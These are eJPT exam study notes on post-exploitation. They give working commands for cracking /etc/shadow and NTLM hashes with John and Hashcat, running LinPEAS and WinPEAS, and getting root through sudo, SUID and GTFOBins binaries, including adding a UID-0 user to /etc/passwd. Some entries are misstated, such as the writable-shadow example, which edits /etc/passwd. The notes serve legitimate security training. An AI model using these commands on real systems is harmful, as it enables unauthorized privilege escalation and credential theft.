PHASE 3: POST-EXPLOITATION TOOLS

JOHN THE RIPPER & HASHCAT - Password Hash Cracking

Overview

John the Ripper and Hashcat are password hash cracking tools. John is CPU-based, Hashcat is GPU-optimized. They attempt to crack hashes using wordlists, rules, and brute force.

Why It's Critical for eJPT:

  • Password hashes are found in SAM, shadow files, databases
  • Can crack weak/common passwords
  • Essential for privilege escalation
  • Found hashes from: /etc/shadow, /etc/passwd, NTLM hashes, MySQL, etc.

Installation & Setup

# CachyOS - John:
sudo pacman -S john
john --version

# CachyOS - Hashcat:
sudo pacman -S hashcat
hashcat --version

John the Ripper - Common Use Cases

1. Crack /etc/shadow File

# After getting root or copying shadow file:
john /etc/shadow
john shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt

Output:

Loaded 4 password hashes with 4 different salts (sha512crypt [SHA512 crypt])
...
user1:password123
admin:welcome2021

2. Identify Hash Type

john --list=formats | grep -i hash_type
john --show shadow.txt  # Show found passwords

3. With Rules (Modify Wordlist)

john shadow.txt --wordlist=rockyou.txt --rules=Jumbo
# Tries: password, Password, PASSWORD, pssword, p@ssword, etc.

4. Brute Force Mode

# Try all combinations (very slow):
john shadow.txt --incremental

5. Specific Hash Type

# Force hash type if not detected:
john hashes.txt --format=md5 --wordlist=rockyou.txt
john hashes.txt --format=sha1 --wordlist=rockyou.txt

6. Show Results

john --show shadow.txt
# Also shows cracked and uncracked

Hashcat - Common Use Cases

1. Crack MD5 Hashes

hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

Flags: - -m 0: MD5 - -a 0: Dictionary attack

2. Crack NTLM (Windows)

hashcat -m 1000 -a 0 hashes.txt rockyou.txt
# -m 1000: NTLM

3. Crack SHA1

hashcat -m 100 -a 0 hashes.txt rockyou.txt

4. Crack SHA-512 (Linux)

hashcat -m 1800 -a 0 hashes.txt rockyou.txt

5. Show Cracked

hashcat -m 0 -a 0 hashes.txt rockyou.txt --show

Practical eJPT Workflow

Complete Hash Cracking Workflow

# Step 1: Extract hashes
cat /etc/shadow  # If root
sqlmap ... --dump  # If from database

# Step 2: Save to file
echo '$6$hash1' > hashes.txt
echo '$6$hash2' >> hashes.txt

# Step 3: Identify hash type
# $6$ = SHA-512
# $1$ = MD5
# $2$ = Bcrypt

# Step 4: Try John first (easy)
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Step 5: If John doesn't find, try Hashcat with GPU:
hashcat -m 1800 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Step 6: Use found credentials
ssh admin@target  # Use cracked password
su - user1  # Switch user

Hash Format Recognition

Hash Format John Hashcat
$6$... SHA-512 sha512crypt -m 1800
$1$... MD5 md5crypt -m 500
$2$... Bcrypt bcrypt -m 3200
$5$... SHA-256 sha256crypt -m 7400
NTLM hash Windows NT -m 1000
MD5 (hex) MD5 raw-md5 -m 0

Tips

  • Use targeted wordlists: rockyou.txt for weak passwords
  • Try common passwords first: admin, password, 123456
  • Use -wordlist= with John: john shadow.txt --wordlist=rockyou.txt
  • GPU acceleration: Hashcat if GPU available
  • Rules: Modify wordlist (Cap, numbers, special chars)
  • Combination: Try John with rockyou, then Hashcat with more lists

LINPEAS & WINPEAS - Privilege Escalation Enumeration

Overview

Linpeas and Winpeas are automated scripts that enumerate system configuration for privilege escalation paths. They search for misconfigurations, weak permissions, vulnerable services, and more.

Why It's Critical for eJPT:

  • Automates privilege escalation enumeration
  • Finds SUID binaries, weak sudoers, kernel exploits
  • Identifies running services with vulnerabilities
  • Finds world-writable files
  • eJPT requires privilege escalation - this helps find the path

Installation & Download

Linpeas (Linux)

# Download:
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Make executable:
chmod +x linpeas.sh

# Transfer to target (if no direct download):
# scp linpeas.sh user@target:/tmp/

Winpeas (Windows)

# Download .exe or .bat:
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.exe

Common Use Cases

1. Run Linpeas on Target

# After getting shell on target:
./linpeas.sh

# Or with output file:
./linpeas.sh > linpeas_output.txt

# Run with more checks:
./linpeas.sh -a  # All checks

Output shows (in RED - critical): - SUID binaries that can escalate - Writable /etc/sudoers - Kernel exploit vulnerabilities - Weak file permissions - Running services vulnerabilities - Cron jobs with weak permissions

2. Download and Run on Windows

# Transfer winPEAS.exe to target:
# scp winPEAS.exe admin@target:C:\Temp\

# Run:
C:\Temp\winPEAS.exe
C:\Temp\winPEAS.exe full  # More thorough

3. Interpret Output

  • RED: Immediate privilege escalation path
  • YELLOW: Possible path, needs verification
  • GREEN: Info only, no direct exploitation
  • BLUE: Section headers

4. Manual Verification

After linpeas shows findings, manually test:

# If SUID binary found:
/usr/bin/sudo -l  # Check sudo

# If kernel exploit vulnerable:
uname -a  # Get kernel version
searchsploit "Kernel 4.4.0"  # Find exploit

# If weak file permission:
ls -la /etc/shadow
cat /etc/shadow  # If readable

Real-World Example

# Scenario: Got user shell, need root

# Step 1: Transfer linpeas
scp linpeas.sh user@192.168.1.50:/tmp/

# Step 2: SSH and run linpeas
ssh user@192.168.1.50
cd /tmp
chmod +x linpeas.sh
./linpeas.sh 2>/dev/null | tee linpeas.txt

# Output shows (in RED):
# [!] Binary /usr/bin/sudo has SUID set
# [!] User can run: /usr/bin/find as SUDO without password

# Step 3: Exploit found vulnerability
sudo find / -name root -exec /bin/sh \;

# Now running as root!
whoami  # root

Manual Privilege Escalation (If linpeas helps find it)

Common Findings & Exploitation

Finding: SUID Binary Misused (e.g., /usr/bin/find)

# linpeas shows find has SUID
find / -name root -exec /bin/sh \;  # Get shell as root

Finding: Writable /etc/shadow

# Linpeas shows shadow is world-writable
# You can modify it directly or add new user
echo 'newuser:$6$hash:0:0:root:/root:/bin/bash' >> /etc/passwd

Finding: Sudo without password

# Linpeas shows:
# (ALL) NOPASSWD: /usr/bin/find

# Simply run:
sudo find / -name root -exec /bin/sh \;

GTFOBINS - Binary Exploitation Reference

Overview

GTFOBins is a website/database of Unix binaries that can be abused for privilege escalation. It documents how to abuse legitimate programs like tar, vim, find, etc.

Why It's Critical for eJPT:

  • Linpeas shows SUID binaries
  • GTFOBins shows how to exploit them
  • Often overlooked legitimate binaries can escalate privileges
  • Essential knowledge for privilege escalation

Website

Visit: https://gtfobins.github.io/

Search for any binary: tar, vim, find, nano, less, etc.

Each entry shows: - Command to check if exploitable: Is SUID set? - Exploit code: How to abuse it - Requirements: What permissions needed

Common Exploitable Binaries

tar

tar -cf /dev/null /etc/shadow --to-stdout
tar xf * --to-command=/bin/sh  # RCE

vim

vim /etc/shadow
:!whoami  # Execute commands as owner
:set shell=/bin/sh
:shell  # Get shell as owner

less

less /etc/passwd
!whoami  # Execute command
!sh  # Get shell

find

find . -exec /bin/sh \;
find /tmp -name test -exec /bin/sh \;

nano

nano /etc/shadow
Ctrl+R Ctrl+X  # Execute command

Practical eJPT Workflow

Complete Privilege Escalation Path

# Step 1: Get initial shell (low privilege user)
ssh user@target

# Step 2: Run linpeas
./linpeas.sh 2>/dev/null | grep -i "red\|yellow"

# Output shows:
# [RED] /usr/bin/vim is SUID

# Step 3: Go to GTFOBins
# Visit gtfobins.github.io/gtfobins/vim/

# Step 4: Find SUID section
# /usr/bin/vim -c ':!/bin/sh'

# Step 5: Exploit!
/usr/bin/vim -c ':!/bin/sh'
whoami  # root

# Success! Privilege escalation complete

Tips

  • Always check GTFOBins: If linpeas finds SUID binary, GTFOBins likely has exploit
  • Try simpler vectors first: Less = easier than compiling kernel exploit
  • Combine findings: Linpeas + GTFOBins = automatic privilege escalation
  • Test carefully: Some binaries have restrictions
